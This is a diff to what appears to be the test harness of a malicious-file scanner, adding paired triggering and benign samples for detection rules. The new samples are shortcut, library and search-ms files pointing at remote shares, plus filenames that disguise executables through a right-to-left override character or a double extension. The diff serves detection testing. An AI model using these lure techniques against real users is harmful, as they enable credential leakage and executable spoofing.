@@ -35,6 +35,7 @@ HEURISTICS = {
     "heuristic_mcp_shell",
     "heuristic_mcp_hidden_instruction",
     "heuristic_double_extension",
+    "heuristic_filename_control",
     "heuristic_document_executable",
     "heuristic_nested_executable",
     "heuristic_pdf_JavaScript",
@@ -229,6 +230,26 @@ def pairs() -> list[tuple[str, bytes, bytes]]:
         ),
         ("shortcut_powershell_encoded", powershell, powershell_miss),
         ("shortcut_mshta_remote", mshta, mshta_miss),
+        (
+            "win_internet_shortcut_launch",
+            b"[InternetShortcut]\r\nURL=file://192.0.2.10/share/report.pdf\r\n",
+            b"[InternetShortcut]\r\nURL=https://example.invalid/docs\r\n",
+        ),
+        (
+            "win_shortcut_remote_icon",
+            b"[Shell]\r\nCommand=2\r\nIconFile=\\\\192.0.2.10\\share\\i.ico\r\n",
+            b"[Shell]\r\nCommand=2\r\nIconFile=explorer.exe,3\r\n",
+        ),
+        (
+            "win_library_remote_location",
+            _library(b"\\\\192.0.2.10\\shared"),
+            _library(b"knownfolder:{FDD39AD0-238F-46AF-ADB4-6C85480369C7}"),
+        ),
+        (
+            "web_search_ms_remote",
+            b'<a href="search-ms:query=a&crumb=location:%5C%5C192.0.2.10%5Cs">x</a>\n',
+            b'<a href="search-ms:query=notes&crumb=location:C%3A%5CUsers">x</a>\n',
+        ),
         ("web_clickfix_lure", _clickfix(), b"Verify you are human. Complete the form.\n"),
         ("web_html_smuggling", _smuggle(), _smuggle().replace(b"example.zip", b"example.png")),
         ("container_disk_image", iso(), b"0123456789"),
@@ -280,6 +301,8 @@ def pairs() -> list[tuple[str, bytes, bytes]]:
             b'{"description":"reads a file"}\n',
         ),
         ("heuristic_double_extension", b"hello\n", b"hello\n"),
+        ("heuristic_double_extension_launcher", b"hello\n", b"hello\n"),
+        ("heuristic_filename_control", b"hello\n", b"hello\n"),
         (
             "heuristic_document_executable",
             zipped("evil.exe", mini_pe()),
@@ -314,6 +337,16 @@ def _clickfix() -> bytes:
     )
 
 
+def _library(url: bytes) -> bytes:
+    return (
+        b'<?xml version="1.0" encoding="UTF-8"?>\r\n'
+        b'<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">'
+        b"<searchConnectorDescriptionList><searchConnectorDescription><simpleLocation>"
+        b"<url>" + url + b"</url></simpleLocation></searchConnectorDescription>"
+        b"</searchConnectorDescriptionList></libraryDescription>\r\n"
+    )
+
+
 def _smuggle() -> bytes:
     return (
         b'<script>const b=atob("UEs="); const f=new Blob([b]); '
@@ -344,6 +377,10 @@ def main() -> None:
         for rule_id, fire, miss in pairs():
             if rule_id == "container_disk_image_dmg":
                 rule_id = "container_disk_image"
+            # A launcher suffix after a decoy; script names after .html stay clean.
+            launcher = rule_id == "heuristic_double_extension_launcher"
+            if launcher:
+                rule_id = "heuristic_double_extension"
             fire_name = "photo.png.app" if rule_id == "heuristic_double_extension" else "fire.bin"
             miss_name = "photo.png" if rule_id == "heuristic_double_extension" else "miss.bin"
             doc_names = {
@@ -359,9 +396,12 @@ def main() -> None:
                 "heuristic_pickle_reduce": ("danger.pkl", "note.pkl"),
                 "heuristic_safetensors_header": ("bad.safetensors", "ok.safetensors"),
                 "heuristic_gguf_header": ("bad.gguf", "ok.gguf"),
+                "heuristic_filename_control": ("invoice_\u202efdp.exe", "invoice_pdf.exe"),
             }
             if rule_id in doc_names:
                 fire_name, miss_name = doc_names[rule_id]
+            if launcher:
+                fire_name, miss_name = "invoice.pdf.lnk", "page.html.js"
             fire_ids = _scan(root, rules, fire_name, fire)
             miss_ids = _scan(root, rules, miss_name, miss)
             if rule_id not in fire_ids:
